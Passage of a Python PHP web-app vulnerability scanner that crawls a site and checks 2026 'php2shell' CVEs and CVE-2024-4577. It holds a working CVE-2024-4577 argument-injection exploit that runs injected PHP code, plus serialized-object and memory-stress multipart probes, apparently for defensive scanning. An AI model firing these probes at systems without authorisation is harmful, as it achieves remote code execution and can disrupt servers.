    def probe_upload_progress(self) -> dict:
        """
        Active black-box signals for session.upload_progress (core of 109619/115560/109618 triggers).
        Returns structured probe result reused by all three 2026 checks.
        """
        if self._up_probe is not None:
            return self._up_probe

        print("\n[PROBE] session.upload_progress / php2shell primitives…")
        result = {
            "tested_urls": [],
            "signals": [],
            "session_set_on_multipart": False,
            "server_errors_on_multipart": False,
            "timing_anomaly": False,
            "progress_key_reflected": False,
            "best_url": None,
            "raw": [],
        }
        targets = self.candidate_php_urls()
        # Prefer upload forms' actions
        for form in self.crawler.upload_forms:
            u = form.get("action")
            if u and u not in targets:
                targets.insert(0, u)
        targets = targets[:12] or [self.root]

        sess = "s" + "".join(random.choices(string.ascii_lowercase + string.digits, k=16))
        progress = "p" + "".join(random.choices(string.ascii_lowercase, k=8))

        for t in targets:
            # Baseline GET
            t0 = time.time()
            base = self.client.get(t, timeout=10.0)
            base_ms = (time.time() - t0) * 1000

            # Small multipart with PHP_SESSION_UPLOAD_PROGRESS first
            boundary, body = self._multipart_upload_progress(progress, [2048, 2048])
            t1 = time.time()
            r = self.client.post(
                t, body,
                headers={
                    "Content-Type": f"multipart/form-data; boundary={boundary}",
                    "Cookie": f"PHPSESSID={sess}",
                },
                allow_redirects=False,
                timeout=20.0,
            )
            post_ms = (time.time() - t1) * 1000
            st = r.get("status")
            h = r.get("headers") or {}
            sc = (h.get("set-cookie") or "") + " " + " ".join(h.get("set-cookie-list") or [])
            text = (r.get("body") or b"").decode("utf-8", errors="replace")
            entry = {
                "url": t, "status": st, "base_ms": round(base_ms, 1), "post_ms": round(post_ms, 1),
                "set_cookie": sc[:120], "err": r.get("error"),
            }
            result["raw"].append(entry)
            result["tested_urls"].append(t)

            if r.get("error") and st is None:
                continue

            if "phpsessid" in sc.lower():
                result["session_set_on_multipart"] = True
                result["signals"].append(f"Set-Cookie PHPSESSID on multipart POST → {t} (status={st})")
                result["best_url"] = result["best_url"] or t

            # Did server accept multipart without auth? (weak but useful)
            if st in (200, 201, 302, 303, 500, 503):
                result["best_url"] = result["best_url"] or t

            if st in (500, 503):
                result["server_errors_on_multipart"] = True
                result["signals"].append(f"HTTP {st} on upload_progress multipart → {t}")

            # progress name leakage / session debug
            if progress in text or f"upload_progress_{progress}" in text:
                result["progress_key_reflected"] = True
                result["signals"].append(f"upload_progress key reflected in body → {t}")

            # coarse timing: multipart much slower may indicate heavy session write / parsing
            if base_ms > 0 and post_ms > max(1500, base_ms * 5) and post_ms > base_ms + 800:
                result["timing_anomaly"] = True
                result["signals"].append(
                    f"Timing anomaly on {t}: GET {base_ms:.0f}ms vs multipart {post_ms:.0f}ms"
                )

        # Aggressive: larger body to stress OOM-adjacent paths (still non-RCE)
        if self.aggressive and (result["best_url"] or targets):
            t = result["best_url"] or targets[0]
            sizes = [128 * 1024] * (6 if self.aggressive else 2)
            boundary, body = self._multipart_upload_progress(progress + "big", sizes)
            r = self.client.post(
                t, body,
                headers={
                    "Content-Type": f"multipart/form-data; boundary={boundary}",
                    "Cookie": f"PHPSESSID={sess}",
                },
                timeout=30.0,
            )
            result["raw"].append({
                "url": t, "status": r.get("status"), "bytes": len(body),
                "mode": "aggressive", "err": r.get("error"),
            })
            if r.get("status") in (500, 503):
                result["server_errors_on_multipart"] = True
                result["signals"].append(
                    f"Aggressive multipart ({len(body)} bytes) → HTTP {r.get('status')} on {t}"
                )
            result["signals"].append(f"Aggressive multipart sent ({len(body)} bytes) status={r.get('status')}")

        # 115560-style key with pipe + serialized object (safe demo class name — look for errors only)
        if result["best_url"] or targets:
            t = result["best_url"] or targets[0]
            evil_key = 'p|O:8:"stdClass":0:{}'
            boundary, body = self._multipart_upload_progress(
                evil_key, [512],
            )
            r = self.client.post(
                t, body,
                headers={
                    "Content-Type": f"multipart/form-data; boundary={boundary}",
                    "Cookie": f"PHPSESSID={sess}b",
                },
                timeout=15.0,
            )
            text = (r.get("body") or b"").decode("utf-8", errors="replace")
            if re.search(r"session_start\(\).*Failed to decode|unserialize|__wakeup|DemoVuln", text, re.I):
                result["signals"].append(f"Serializer/unserialize error noise on pipe-key probe → {t}")
            result["raw"].append({"url": t, "status": r.get("status"), "mode": "pipe-key", "err": r.get("error")})

        if result["signals"]:
            for s in result["signals"]:
                print(f"  [signal] {s}")
        else:
            print("  [signal] No strong upload_progress side-effects observed (common on hardened/fpm configs)")

        self._up_probe = result
        return result

    # ----- 2026 CVE checks -----

    def check_cve_2026_109619(self):
        """Primary php2shell UAF — most actionable of the 2026 pair."""
        cve = "CVE-2026-109619"
        meta = CVE_2026[cve]
        ver_vuln, ver_note = php2shell_version_vulnerable(self.fp.php_version)
        probe = self.probe_upload_progress()
        evidence = [ver_note]
        evidence.extend(probe.get("signals") or [])
        affected = list(dict.fromkeys(
            ([probe["best_url"]] if probe.get("best_url") else []) + (probe.get("tested_urls") or [])[:5]
        ))

        if self.fp.is_mod_php_likely or self.fp.is_apache:
            evidence.append("Apache/mod_php-like SAPI — highest impact profile for cross-request UAF")
        if self.fp.is_fpm_likely or self.fp.is_nginx:
            evidence.append("nginx/php-fpm likely — cross-request worker reuse reduced, but FPM chains still exist")
        if self.fp.upload_progress_signal:
            evidence.append("phpinfo shows session.upload_progress.enabled=On")
        if self.crawler.upload_forms:
            evidence.append(f"Found {len(self.crawler.upload_forms)} multipart file-upload form(s) in crawl")

        php_present = bool(
            self.fp.php_version
            or self.fp.powered_by
            or self.fp.upload_progress_signal
            or self.crawler.php_urls
            or ("PHP" in self.fp.tech)
            or any(c.upper() == "PHPSESSID" for c in self.fp.cookies)
        )

        if ver_vuln is False:
            self.add(Finding(
                cve=cve, title=meta["title"], severity=meta["severity"],
                status="NOT_VULNERABLE", confidence="medium",
                evidence=evidence + ["Version at/above 2026-10-21 fix floor"],
                remediation=meta["remediation"],
                notes="Still keep upload_progress disabled as defense-in-depth.",
            ))
            return

        if not php_present:
            self.add(Finding(
                cve=cve, title=meta["title"], severity=meta["severity"],
                status="NOT_APPLICABLE", confidence="low",
                evidence=evidence + ["No PHP footprint detected on crawled app"],
                remediation=meta["remediation"],
            ))
            return

        # Scoring
        score = 0
        if ver_vuln is True:
            score += 4
        if self.fp.is_mod_php_likely or self.fp.is_apache:
            score += 2
        if probe.get("session_set_on_multipart") or probe.get("progress_key_reflected"):
            score += 2
        if self.fp.upload_progress_signal:
            score += 2
        if probe.get("server_errors_on_multipart") and self.aggressive:
            score += 1
        if self.crawler.upload_forms:
            score += 1
        if ver_vuln is None and php_present:
            score += 1  # unknown version but PHP

        # Gate: no vulnerable version and no upload_progress proof → NOT_APPLICABLE
        if ver_vuln is not True and not self.fp.upload_progress_signal and not (
            probe.get("session_set_on_multipart") or probe.get("progress_key_reflected")
        ):
            self.add(Finding(
                cve=cve, title=meta["title"], severity=meta["severity"],
                status="NOT_APPLICABLE", confidence="medium" if not php_present else "low",
                evidence=evidence + [
                    "No vulnerable PHP version observed and no session.upload_progress confirmation. "
                    "Cannot prove CVE-2026-109619 on this target."
                ],
                remediation=meta["remediation"],
                notes="Requires version below fix floor and/or phpinfo upload_progress=On for CONFIRMED/LIKELY.",
            ))
            return

        if score >= 6:
            status, conf = "LIKELY", "medium"
        elif score >= 3:
            status, conf = "POSSIBLE", "low" if ver_vuln is not True else "medium"
        else:
            status, conf = "POSSIBLE", "low"

        # Full RCE is not claimed without heap chain proof
        evidence.append(
            "Full RCE requires worker pinning + heap leak + build-specific libphp offsets "
            "(not executed by this scanner). Treat LIKELY/POSSIBLE as patch-now priority."
        )
        evidence.append(
            f"Risk score={score} (version/SAPI/upload_progress signals). "
            f"Public chains: kengwang/php2shell-exp, aarsaputra/php2shell, segfaultx01/php2shell-pocJavali"
        )

        self.add(Finding(
            cve=cve, title=meta["title"], severity=meta["severity"],
            status=status, confidence=conf, evidence=evidence,
            affected_urls=affected, remediation=meta["remediation"],
            notes="Unauthenticated pure-HTTP RCE class when conditions met.",
        ))

    def check_cve_2026_109618(self):
        cve = "CVE-2026-109618"
        meta = CVE_2026[cve]
        ver_vuln, ver_note = php2shell_version_vulnerable(self.fp.php_version)
        probe = self.probe_upload_progress()
        evidence = [ver_note]
        evidence.extend([s for s in (probe.get("signals") or []) if "error" in s.lower() or "Aggressive" in s or "Timing" in s])
        evidence.append("Single-request OOM/bailout corruption family; shares trigger surface with upload_progress / heavy multipart")

        php_present = bool(
            self.fp.php_version
            or self.fp.powered_by
            or self.fp.upload_progress_signal
            or self.crawler.php_urls
            or ("PHP" in self.fp.tech)
            or any(c.upper() == "PHPSESSID" for c in self.fp.cookies)
        )
        affected = [probe["best_url"]] if probe.get("best_url") else (probe.get("tested_urls") or [])[:3]

        if ver_vuln is False:
            self.add(Finding(
                cve=cve, title=meta["title"], severity=meta["severity"],
                status="NOT_VULNERABLE", confidence="medium", evidence=evidence,
                remediation=meta["remediation"],
            ))
            return
        if not php_present:
            self.add(Finding(
                cve=cve, title=meta["title"], severity=meta["severity"],
                status="NOT_APPLICABLE", confidence="low",
                evidence=evidence + ["No PHP footprint"], remediation=meta["remediation"],
            ))
            return

        if ver_vuln is True:
            status = "LIKELY" if (self.fp.is_mod_php_likely or self.fp.is_apache or probe.get("server_errors_on_multipart")) else "POSSIBLE"
            conf = "medium" if status == "LIKELY" else "low"
        else:
            # unknown version without proof → not a finding
            self.add(Finding(
                cve=cve, title=meta["title"], severity=meta["severity"],
                status="NOT_APPLICABLE", confidence="low",
                evidence=evidence + ["No vulnerable PHP version fingerprint — cannot prove CVE-2026-109618."],
                remediation=meta["remediation"],
            ))
            return

        evidence.append(
            "Interim incomplete mitigation: memory_limit=-1 via php_admin_value. Patch is mandatory."
        )
        self.add(Finding(
            cve=cve, title=meta["title"], severity=meta["severity"],
            status=status, confidence=conf, evidence=evidence,
            affected_urls=affected, remediation=meta["remediation"],
        ))

    def check_cve_2026_115560(self):
        cve = "CVE-2026-115560"
        meta = CVE_2026[cve]
        ver_vuln, ver_note = php2shell_version_vulnerable(self.fp.php_version)
        probe = self.probe_upload_progress()
        evidence = [
            ver_note,
            "Requires ALL three legs: (1) serialize_handler=php_binary|php_serialize in config, "
            "(2) app ini_set() to 'php' before session_start(), (3) upload_progress enabled",
        ]
        evidence.extend(probe.get("signals") or [])

        # Crawl for code smells
        for p in self.crawler.pages:
            t = p.get("text") or ""
            if re.search(r"serialize_handler|session\.serialize|php_binary|php_serialize", t, re.I):
                evidence.append(f"serialize_handler mention in {p.get('url')}")
            if re.search(r"Failed to decode session object", t, re.I):
                evidence.append(f"Session decode failure message at {p.get('url')} (classic cross-handler symptom)")

        php_present = bool(
            self.fp.php_version
            or self.fp.powered_by
            or self.fp.upload_progress_signal
            or self.crawler.php_urls
            or ("PHP" in self.fp.tech)
            or any(c.upper() == "PHPSESSID" for c in self.fp.cookies)
        )

        if not php_present:
            status, conf = "NOT_APPLICABLE", "medium"
            evidence.append("No reliable PHP footprint.")
        elif ver_vuln is False:
            status, conf = "NOT_VULNERABLE", "low"
            evidence.append("On fix-floor builds residual risk is mainly the config combo; keep upload_progress off")
        elif ver_vuln is True and (self.fp.upload_progress_signal or probe.get("session_set_on_multipart")):
            status, conf = "POSSIBLE", "low"
            evidence.append(
                "Version in range + upload_progress signals. Full three-leg combo still needs app/ini confirmation."
            )
        elif ver_vuln is True:
            status, conf = "POSSIBLE", "low"
            evidence.append(
                "Version in affected range but upload_progress not confirmed; three-leg combo unproven."
            )
        else:
            status, conf = "NOT_APPLICABLE", "low"
            evidence.append("PHP version unknown — cannot prove CVE-2026-115560.")

        self.add(Finding(
            cve=cve, title=meta["title"], severity=meta["severity"],
            status=status, confidence=conf, evidence=evidence,
            affected_urls=[probe["best_url"]] if probe.get("best_url") else [],
            remediation=meta["remediation"],
            notes="Same immediate mitigation as CVE-2026-109619: session.upload_progress.enabled=0",
        ))

    # ----- secondary CVEs -----

    def check_cve_2024_4577(self):
        cve = "CVE-2024-4577"
        meta = CVE_SECONDARY_RULES[cve]
        ver_vuln = check_version_vulnerable(self.fp.php_version or "", meta) if self.fp.php_version else None
        evidence = []
        if self.fp.php_version:
            evidence.append(f"PHP {self.fp.php_version} version-vuln={ver_vuln}")
        if self.fp.is_windows is False and not self.fp.is_cgi:
            self.add(Finding(cve=cve, title=meta["title"], severity=meta["severity"],
                             status="NOT_APPLICABLE", confidence="medium",
                             evidence=evidence + ["Not Windows CGI profile"],
                             remediation=meta["remediation"]))
            return

        marker = "CVE4577_" + hashlib.md5(f"{time.time()}{random.random()}".encode()).hexdigest()[:10]
        php_code = f"<?php echo '{marker}'; ?>"
        query = "%ADd+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input"
        headers = {"Content-Type": "application/x-www-form-urlencoded", "Redirect-Status": "1"}

        bases = [
            urllib.parse.urljoin(self.root, p) for p in (
                "/php-cgi/php-cgi.exe", "/cgi-bin/php-cgi.exe", "/cgi-bin/php.exe",
                "/index.php", "/",
            )
        ] + self.candidate_php_urls()
        seen, confirmed, affected = set(), False, []
        for base in bases:
            k = url_key(base)
            if k in seen:
                continue
            seen.add(k)
            p = urllib.parse.urlparse(base)
            attack = urllib.parse.urlunparse((p.scheme, p.netloc, p.path or "/", "", query, ""))
            r = self.client.post(attack, php_code.encode(), headers=headers, allow_redirects=False, timeout=8.0)
            body = (r.get("body") or b"").decode("utf-8", errors="replace")
            if marker in body:
                confirmed = True
                affected.append(attack)
                evidence.append(f"RCE marker returned from {attack}")
                break
            if len(seen) >= 12:
                break

        if confirmed:
            self.add(Finding(cve=cve, title=meta["title"], severity=meta["severity"],
                             status="CONFIRMED", confidence="high", evidence=evidence,
                             affected_urls=affected, remediation=meta["remediation"]))
        elif ver_vuln is False:
            self.add(Finding(cve=cve, title=meta["title"], severity=meta["severity"],
                             status="NOT_VULNERABLE", confidence="medium", evidence=evidence,
                             remediation=meta["remediation"]))
        elif self.fp.is_windows and (self.fp.is_cgi or ver_vuln):
            self.add(Finding(cve=cve, title=meta["title"], severity=meta["severity"],
                             status="LIKELY" if ver_vuln else "POSSIBLE",
                             confidence="medium" if ver_vuln else "low",
                             evidence=evidence + ["Windows CGI profile; active marker probe failed"],
                             remediation=meta["remediation"]))
        else:
            self.add(Finding(cve=cve, title=meta["title"], severity=meta["severity"],
                             status="POSSIBLE" if ver_vuln else "NOT_APPLICABLE",
                             confidence="low", evidence=evidence or ["Insufficient evidence"],
                             remediation=meta["remediation"]))

    def check_secondary_version_only(self):
        for cve, meta in CVE_SECONDARY_RULES.items():
            if cve == "CVE-2024-4577":
                continue  # handled actively
            ver_vuln = check_version_vulnerable(self.fp.php_version or "", meta) if self.fp.php_version else None
            evidence = []
            if self.fp.php_version:
                evidence.append(f"PHP {self.fp.php_version} → version_vulnerable={ver_vuln}")
            else:
                evidence.append("PHP version unknown")

            if meta.get("windows_only") and self.fp.is_windows is False:
                status, conf = "NOT_APPLICABLE", "medium"
                evidence.append("Non-Windows target")
            elif meta.get("windows_cgi") and self.fp.is_windows is False and not self.fp.is_cgi:
                status, conf = "NOT_APPLICABLE", "medium"
                evidence.append("Windows CGI not indicated")
            elif ver_vuln is False:
                status, conf = "NOT_VULNERABLE", "medium"
            elif ver_vuln is True:
                status, conf = "POSSIBLE", "low"
                evidence.append("Version in affected range; exploitability depends on app code/SAPI")
            elif "PHP" in self.fp.tech or self.crawler.php_urls:
                status, conf = "POSSIBLE", "info"
            else:
                status, conf = "NOT_APPLICABLE", "low"

            self.add(Finding(
                cve=cve, title=meta["title"], severity=meta["severity"],
                status=status, confidence=conf, evidence=evidence,
                remediation=meta["remediation"],
            ))

    def run_all(self) -> list[Finding]:
        print("\n[SCAN] CVE checks…")
        print("  --- 2026 PHP critical family (primary) ---")
        self.check_cve_2026_109619()
        self.check_cve_2026_109618()
        self.check_cve_2026_115560()
        if not self.only_2026:
            print("  --- 2024–2025 PHP core (secondary) ---")
            self.check_cve_2024_4577()
            self.check_secondary_version_only()
        return self.findings


# ===========================================================================
# Report
# ===========================================================================

def severity_rank(s):
    return {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3}.get((s or "").upper(), 9)


def status_rank(s):
    return {"CONFIRMED": 0, "LIKELY": 1, "POSSIBLE": 2, "ERROR": 3,
            "NOT_VULNERABLE": 4, "NOT_APPLICABLE": 5}.get(s, 9)


def print_report(root, fp, crawler, findings, elapsed) -> dict:
    print("\n" + "=" * 78)
    print(" PHP WEB APPLICATION CVE SCAN REPORT")
    print("=" * 78)
    print(f" Target     : {root}")
    print(f" Scanned at : {datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M:%S UTC')}")
    print(f" Duration   : {elapsed:.1f}s")
    print(f" Pages      : {len(crawler.pages)} | Endpoints: {len(crawler.endpoints)} | "
          f"Forms: {len(crawler.forms)} | Upload forms: {len(crawler.upload_forms)}")
    print(f" PHP        : {fp.php_version or 'unknown'} via {fp.php_version_source or 'n/a'}")
    print(f" Server     : {fp.server or 'unknown'}")
    print(f" SAPI guess : mod_php={fp.is_mod_php_likely} fpm={fp.is_fpm_likely} cgi={fp.is_cgi}")
    print(f" Tech       : {', '.join(fp.tech) or 'n/a'}")
    print("-" * 78)

    # Highlight 2026 first
    f2026 = [f for f in findings if f.cve.startswith("CVE-2026-")]
    fother = [f for f in findings if not f.cve.startswith("CVE-2026-")]
    vulnerable = [f for f in findings if f.status in ("CONFIRMED", "LIKELY", "POSSIBLE")]
    vulnerable.sort(key=lambda f: (0 if f.cve.startswith("CVE-2026-") else 1,
                                   status_rank(f.status), severity_rank(f.severity), f.cve))

    print("\n### 2026 PHP CVEs (php2shell family)\n")
    for f in f2026:
        print(f"  {f.status:<14} {f.severity:<10} {f.cve}")
        print(f"               {f.title}")
        print(f"               confidence={f.confidence}")
        for e in f.evidence[:5]:
            print(f"               • {e}")
        if f.affected_urls:
            print(f"               urls: {', '.join(f.affected_urls[:4])}")
        print(f"               fix: {f.remediation[:120]}")
        print()

    print("### ALL FINDINGS NEEDING ATTENTION (CONFIRMED / LIKELY / POSSIBLE)\n")
    if not vulnerable:
        print("  (none)\n")
    else:
        for f in vulnerable:
            if f in f2026:
                continue  # already shown
            print(f"  {f.status:<12} {f.severity:<8} {f.cve} — {f.title}")
            for e in f.evidence[:2]:
                print(f"               • {e}")
            print()

    clean = [f for f in findings if f.status == "NOT_VULNERABLE"]
    na = [f for f in findings if f.status == "NOT_APPLICABLE"]
    print("### NOT VULNERABLE\n")
    for f in clean:
        print(f"  {f.cve:<18} {f.evidence[0] if f.evidence else ''}")
    print("\n### NOT APPLICABLE\n")
    for f in na:
        print(f"  {f.cve:<18} {(f.notes or (f.evidence[-1] if f.evidence else ''))[:90]}")

    n_c = len([f for f in findings if f.status == "CONFIRMED"])
    n_l = len([f for f in findings if f.status == "LIKELY"])
    n_p = len([f for f in findings if f.status == "POSSIBLE"])
    print("\n" + "=" * 78)
    print(f" SUMMARY: {n_c} confirmed | {n_l} likely | {n_p} possible | "
          f"{len(clean)} not vulnerable | {len(na)} n/a")
    # 2026 one-liner
    for f in f2026:
        flag = "VULN?" if f.status in ("CONFIRMED", "LIKELY", "POSSIBLE") else f.status
        print(f"   2026 {f.cve}: {flag}")
    print("=" * 78)

    return {
        "target": root,
        "scanned_at": datetime.now(timezone.utc).isoformat(),
        "duration_seconds": round(elapsed, 2),
        "fingerprint": asdict(fp),
        "crawl": {
            "pages": len(crawler.pages),
            "endpoints": sorted(crawler.endpoints)[:500],
            "forms": len(crawler.forms),
            "upload_forms": len(crawler.upload_forms),
            "php_urls": sorted(crawler.php_urls),
            "params": sorted(crawler.params)[:200],
            "errors": crawler.errors[:50],
        },
        "findings": [asdict(f) for f in findings],
        "summary": {
            "confirmed": [f.cve for f in findings if f.status == "CONFIRMED"],
            "likely": [f.cve for f in findings if f.status == "LIKELY"],
            "possible": [f.cve for f in findings if f.status == "POSSIBLE"],
            "not_vulnerable": [f.cve for f in findings if f.status == "NOT_VULNERABLE"],
            "not_applicable": [f.cve for f in findings if f.status == "NOT_APPLICABLE"],
            "cve_2026": {f.cve: f.status for f in f2026},
        },
    }


# ===========================================================================
# Main
# ===========================================================================

def parse_header_list(items):
    out = {}
    for item in items or []:
        if ":" in item:
            k, v = item.split(":", 1)
            out[k.strip()] = v.strip()
    return out


def main() -> int:
    ap = argparse.ArgumentParser(
        description="Crawl a web app and report PHP CVE exposure (2026 php2shell family + recent core CVEs)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__,
    )
    ap.add_argument("target", help="Root URL, e.g. https://app.example/")
    ap.add_argument("-d", "--depth", type=int, default=3, help="Crawl depth (default 3)")
    ap.add_argument("-m", "--max-pages", type=int, default=100, help="Max pages (default 100)")
    ap.add_argument("-o", "--output", default="", help="JSON report path")
    ap.add_argument("-t", "--timeout", type=float, default=12.0)
    ap.add_argument("--cookie", default="", help="Cookie header value")
    ap.add_argument("-H", "--header", action="append", default=[], help="Extra header 'Name: value'")
    ap.add_argument("--ua", default="PHP-App-CVE-Scanner/2.0")
    ap.add_argument("--delay", type=float, default=0.0)
    ap.add_argument("--secure", action="store_true", help="Verify TLS")
    ap.add_argument("--subdomains", action="store_true")
    ap.add_argument("--robots", action="store_true")
    ap.add_argument("--aggressive", action="store_true", help="Heavier upload_progress / OOM-adjacent probes")
    ap.add_argument("--only-2026", action="store_true", help="Only test CVE-2026-109618/109619/115560")
    ap.add_argument("-q", "--quiet", action="store_true")
    args = ap.parse_args()

    target = args.target.strip()
    if not re.match(r"^https?://", target, re.I):
        target = "http://" + target
    p = urllib.parse.urlparse(target)
    if not p.netloc:
        print("Invalid target URL", file=sys.stderr)
        return 2
    root = f"{p.scheme}://{p.netloc}/"

    client = HttpClient(
        timeout=args.timeout,
        verify_ssl=bool(args.secure),
        user_agent=args.ua,
        extra_headers=parse_header_list(args.header),
        cookie=args.cookie,
        rate_delay=args.delay,
    )

    print(f"[+] Target: {root}")
    if args.only_2026:
        print("[+] Mode: 2026 PHP CVEs only (CVE-2026-109618, CVE-2026-109619, CVE-2026-115560)")
    probe = client.get(root)
    if probe.get("error") and probe.get("status") is None:
        print(f"[!] Cannot reach target: {probe['error']}", file=sys.stderr)
        return 2
    print(f"[+] Reachable (status={probe.get('status')})")

    t0 = time.time()
    crawler = Crawler(
        root=root, client=client, max_pages=args.max_pages, max_depth=args.depth,
        include_subdomains=args.subdomains, respect_robots=args.robots, verbose=not args.quiet,
    )
    crawler.crawl()
    if not crawler.pages and probe.get("status"):
        crawler.pages.append({
            "url": root, "final_url": probe.get("final_url") or root,
            "status": probe.get("status"), "headers": probe.get("headers") or {},
            "body": probe.get("body") or b"",
            "text": (probe.get("body") or b"").decode("utf-8", errors="replace"),
            "ct": (probe.get("headers") or {}).get("content-type", ""), "error": None,
        })

    fp = fingerprint(crawler, client)
    scanner = Scanner(root, client, crawler, fp, aggressive=args.aggressive, only_2026=args.only_2026)
    findings = scanner.run_all()
    elapsed = time.time() - t0
    report = print_report(root, fp, crawler, findings, elapsed)

    out = args.output or f"php_cve_report_{p.netloc.replace(':', '_')}_{int(time.time())}.json"
    if not os.path.isabs(out):
        out = os.path.abspath(out)
    with open(out, "w", encoding="utf-8") as f:
        json.dump(report, f, indent=2)
    print(f"\n[+] JSON report → {out}")

    if any(f.status in ("CONFIRMED", "LIKELY") for f in findings):
        return 1
    return 0


if __name__ == "__main__":
    sys.exit(main())
